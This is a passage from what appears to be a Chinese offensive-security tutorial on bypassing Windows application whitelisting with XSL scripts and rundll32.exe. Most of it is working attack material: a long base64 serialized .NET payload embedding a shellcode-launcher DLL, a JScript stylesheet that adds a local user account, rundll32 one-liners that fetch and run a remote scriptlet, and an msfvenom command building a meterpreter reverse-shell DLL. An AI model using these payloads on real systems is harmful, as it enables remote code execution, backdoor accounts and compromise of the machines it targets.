class="line">&quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+  </span><br><span class="line">&quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+  </span><br><span class="line">&quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+  </span><br><span class="line">&quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+  </span><br><span class="line">&quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+  </span><br><span class="line">&quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+  </span><br><span class="line">&quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+  </span><br><span class="line">&quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+  </span><br><span class="line">&quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+  </span><br><span class="line">&quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+  </span><br><span class="line">&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+  </span><br><span class="line">&quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+  </span><br><span class="line">&quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+  </span><br><span class="line">&quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+  </span><br><span class="line">&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;+  </span><br><span class="line">&quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA&quot;+</span><br><span class="line">&quot;AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA&quot;+  </span><br><span class="line">&quot;AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA&quot;+  </span><br><span class="line">&quot;AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA&quot;+  </span><br><span class="line">&quot;KAIAAAYAACoAAAAAAAAA&#x2F;OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH&#x2F;rDxhfAIsIMHPDQHH&quot;+  </span><br><span class="line">&quot;4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx&#x2F;6zBzw0BxzjgdfYDffg7fSR15FiL&quot;+  </span><br><span class="line">&quot;WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf&#x2F;gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej&#x2F;&quot;+  </span><br><span class="line">&quot;0LiQAQAAKcRUUGgpgGsA&#x2F;9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D&#x2F;1ZdqEFZXaJmldGH&#x2F;&quot;+  </span><br><span class="line">&quot;1YXAdAr&#x2F;Tgh17OhnAAAAagBqBFZXaALZyF&#x2F;&#x2F;1YP4AH42izZqQGgAEAAAVmoAaFikU+X&#x2F;1ZNTagBW&quot;+  </span><br><span class="line">&quot;U1doAtnIX&#x2F;&#x2F;Vg&#x2F;gAfShYaABAAABqAFBoCy8PMP&#x2F;VV2h1bk1h&#x2F;9VeXv8MJA+FcP&#x2F;&#x2F;&#x2F;+mb&#x2F;&#x2F;&#x2F;&#x2F;AcMp&quot;+  </span><br><span class="line">&quot;xnXBw7vwtaJWagBT&#x2F;9UAAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKChYGjml+&quot;+  </span><br><span class="line">&quot;AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMo&quot;+  </span><br><span class="line">&quot;BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z&quot;+  </span><br><span class="line">&quot;MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA&quot;+  </span><br><span class="line">&quot;ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA&quot;+  </span><br><span class="line">&quot;DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB&quot;+  </span><br><span class="line">&quot;AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC&quot;+  </span><br><span class="line">&quot;hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA&quot;+  </span><br><span class="line">&quot;AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA&quot;+  </span><br><span class="line">&quot;aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA&quot;+  </span><br><span class="line">&quot;AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA&quot;+  </span><br><span class="line">&quot;BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu&quot;+  </span><br><span class="line">&quot;ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA&quot;+  </span><br><span class="line">&quot;UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB&#x2F;AAEAAAEJ&quot;+  </span><br><span class="line">&quot;AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA&quot;+  </span><br><span class="line">&quot;AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD&quot;+  </span><br><span class="line">&quot;b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA&quot;+  </span><br><span class="line">&quot;UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT&quot;+  </span><br><span class="line">&quot;aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs&quot;+  </span><br><span class="line">&quot;cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh&quot;+  </span><br><span class="line">&quot;dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp&quot;+  </span><br><span class="line">&quot;dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u&quot;+  </span><br><span class="line">&quot;AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0&quot;+  </span><br><span class="line">&quot;dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA&quot;+  </span><br><span class="line">&quot;Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB&quot;+  </span><br><span class="line">&quot;QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T&quot;+  </span><br><span class="line">&quot;dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs&quot;+  </span><br><span class="line">&quot;cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F&quot;+</span><br><span class="line">&quot;eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A&quot;+  </span><br><span class="line">&quot;RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp&quot;+  </span><br><span class="line">&quot;ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ&quot;+  </span><br><span class="line">&quot;AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH&quot;+  </span><br><span class="line">&quot;AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy&quot;+  </span><br><span class="line">&quot;YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl&quot;+  </span><br><span class="line">&quot;Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs&quot;+  </span><br><span class="line">&quot;dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy&quot;+  </span><br><span class="line">&quot;aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW&quot;+  </span><br><span class="line">&quot;AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv&#x2F;gAAAQAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA&quot;+  </span><br><span class="line">&quot;AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA&quot;+  </span><br><span class="line">&quot;RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE&quot;+  </span><br><span class="line">&quot;AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A&quot;+  </span><br><span class="line">&quot;AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp&quot;+  </span><br><span class="line">&quot;AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA&quot;+  </span><br><span class="line">&quot;bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu&quot;+  </span><br><span class="line">&quot;AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA&quot;+  </span><br><span class="line">&quot;NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB&quot;+  </span><br><span class="line">&quot;AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs&quot;+  </span><br><span class="line">&quot;ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA&quot;;</span><br><span class="line"></span><br><span class="line">		var entry_class &#x3D; &#39;ShellCodeLauncher.Program&#39;;</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line"></span><br><span class="line">		setversion();</span><br><span class="line"></span><br><span class="line">		var stm &#x3D; base64ToStream(serialized_obj);</span><br><span class="line"></span><br><span class="line">		var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);</span><br><span class="line"></span><br><span class="line">		var al &#x3D; new ActiveXObject(&#39;System.Collections.ArrayList&#39;);</span><br><span class="line"></span><br><span class="line">		var d &#x3D; fmt.Deserialize_2(stm);</span><br><span class="line"></span><br><span class="line">		al.Add(undefined);</span><br><span class="line"></span><br><span class="line">		var o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</span><br><span class="line"></span><br><span class="line">		&#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">		debug(e.message);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor_2003.xsl</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">	xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.worg&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas‐microsoft‐com:xslt&quot;</span><br><span class="line"></span><br><span class="line">	xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">	version&#x3D;&quot;0&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;ms:script implements‐prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">		var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;net user Micropoor Micropoor &#x2F;add&quot;);</span><br><span class="line"></span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="81-基于白名单Rundll32-exe执行payload第十一季"><a href="#81-基于白名单Rundll32-exe执行payload第十一季" class="headerlink" title="81. 基于白名单Rundll32.exe执行payload第十一季"></a>81. 基于白名单Rundll32.exe执行payload第十一季</h2></li>
<li><p>Windows 2003 默认位置</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe</span><br><span class="line">C:\Windows\SysWOW64\rundll32.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe</span><br><span class="line">C:\Windows\SysWOW64\rundll32.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\SysWOW64\rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;document.write();GetObject(&quot;script:http:&#x2F;&#x2F;192.168.1.4&#x2F;Rundll32_shellcode&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>基于本地加载（2）</p>
<ul>
<li><strong>payload</strong>配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐a x86 ‐‐platform windows ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐f dll &gt; Micropoor_Rundll32.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32 shell32.dll,Control_RunDLL d:\Micropoor_Rundll32.dll</span><br></pre></td></tr></table></figure></li>
<li><p>基于命令执行（3）</p>
<ul>
<li>靶机执行[<strong>Windows 2003</strong>]</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w&#x3D;new ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;mstsc\&quot;);window.close()&quot;);</span><br></pre></td></tr></table></figure></li>
<li><p>Rundll32_shellcode</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;?xml version&#x3D;&quot;0&quot;?&gt;  </span><br><span class="line">&lt;package&gt;  </span><br><span class="line">&lt;component id&#x3D;&quot;Micropoor&quot;&gt;  </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;  </span><br><span class="line">&lt;![CDATA[  </span><br><span class="line">function setversion() &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">function debug(s) &#123;&#125;  </span><br><span class="line">function base64ToStream(b) &#123;  </span><br><span class="line">var enc &#x3D; new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);  </span><br><span class="line">var length &#x3D; enc.GetByteCount_2(b);  </span><br><span class="line">var ba &#x3D; enc.GetBytes_4(b);  </span><br><span class="line">var transform &#x3D; new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);  </span><br><span class="line">ba &#x3D; transform.TransformFinalBlock(ba, 0, length);  </span><br><span class="line">var ms &#x3D; new ActiveXObject(&quot;System.IO.MemoryStream&quot;);  </span><br><span class="line">ms.Write(ba, 0, (length &#x2F; 4) * 3);  </span><br><span class="line">ms.Position &#x3D; 0;  </span><br><span class="line">return ms;  </span><br><span class="line">&#125; </span><br><span class="line">var serialized_obj &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+  </span><br><span class="line">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+  </span><br><span class="line">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+</span><br><span class="line">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+  </span><br><span class="line">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+  </span><br><span class="line">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+  </span><br><span class="line">&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+  </span><br><span class="line">&quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+  </span><br><span class="line">&quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+  </span><br><span class="line">&quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+  </span><br><span class="line">&quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+  </span><br><span class="line">&quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+  </span><br><span class="line">&quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+  </span><br><span class="line">&quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+  </span><br><span class="line">&quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+  </span><br><span class="line">&quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+  </span><br><span class="line">&quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+  </span><br><span class="line">&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+  </span><br><span class="line">&quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+  </span><br><span 